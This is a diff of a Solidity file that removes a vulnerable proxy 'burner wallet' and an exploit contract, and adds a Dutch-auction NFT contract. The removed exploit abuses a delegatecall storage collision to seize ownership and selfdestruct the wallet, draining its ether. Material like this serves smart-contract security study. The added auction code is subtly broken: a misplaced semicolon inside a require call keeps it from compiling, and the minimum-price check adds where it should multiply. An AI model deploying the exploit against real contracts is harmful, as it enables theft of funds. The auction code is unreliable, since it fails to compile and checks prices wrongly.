@@ -1,69 +1,62 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.13;
 
-contract BurnerWallet {
-    address public implementation;
-    address payable public owner;
-
-    constructor(address _implementation) {
-        implementation = _implementation;
-        owner = payable(msg.sender);
-    }
-
-    fallback() external payable {
-        (bool executed, ) = implementation.delegatecall(msg.data);
-        require(executed, "failed");
-    }
-
-    function kill() external {
-        require(msg.sender == owner, "not owner");
-        selfdestruct(owner);
-    }
+interface IERC721 {
+  function transferFrom(
+    address _from,
+    address _to,
+    uint256 _nftId
+  ) external;
 }
 
-contract BurnerWalletImplementation {
-    address public implementation;
-    uint256 public limit;
-    address payable public owner;
+contract DutchAuction {
+  uint256 private constant DURATION = 7 days;
 
-    receive() external payable {}
+  IERC721 public immutable nft;
+  uint256 public immutable nftId;
 
-    modifier onlyOwner() {
-        require(msg.sender == owner, "!owner");
-        _;
+  address payable public immutable seller;
+  uint256 public immutable startingPrice;
+  uint256 public immutable startAt;
+  uint256 public immutable expiresAt;
+  uint256 public immutable discountRate;
+
+  constructor(
+    uint256 _startingPrice,
+    uint256 _discountRate,
+    address _nft,
+    uint256 _nftId
+  ) {
+    seller = payable(msg.sender);
+    startingPrice = _startingPrice;
+    startAt = block.timestamp;
+    expiresAt = block.timestamp + DURATION;
+    discountRate = _discountRate;
+
+    require(
+      _startingPrice >= _discountRate + DURATION;
+      "starting price < min"
+    );
+
+    nft = IERC721(_nft);
+    nftId = _nftId;
+  }
+
+  function getPrice() public view returns (uint256) {
+    return startingPrice - (discountRate * (block.timestamp - startAt));
+  }
+
+  function buy() external payable {
+    require(block.timestamp < expiresAt, "auction expired");
+
+    uint256 price = getPrice();
+
+    require(msg.value >= price);
+    nft.transferFrom(seller, msg.sender, nftId);
+    uint256 refund = msg.value - price;
+    if (refund > 0) {
+      payable(msg.sender).transfer(refund);
     }
-
-    function setWithdrawLimit(uint256 _limit) external {
-        limit = _limit;
-    }
-
-    function withdraw() external onlyOwner {
-        uint256 amount = address(this).balance;
-        if (amount > limit) {
-            amount = limit;
-        }
-        owner.transfer(amount);
-    }
-}
-
-interface IBurnerWallet {
-    function setWithdrawLimit(uint256 limit) external;
-
-    function kill() external;
-}
-
-contract BurnerWalletExploit {
-    address public target;
-
-    constructor(address _target) {
-        target = _target;
-    }
-
-    function pwn() external {
-        // set owner to this contract
-        IBurnerWallet(target).setWithdrawLimit(uint256(uint160(address(this))));
-
-        // kill to drain wallet
-        IBurnerWallet(target).kill();
-    }
+    selfdestruct(seller);
+  }
 }
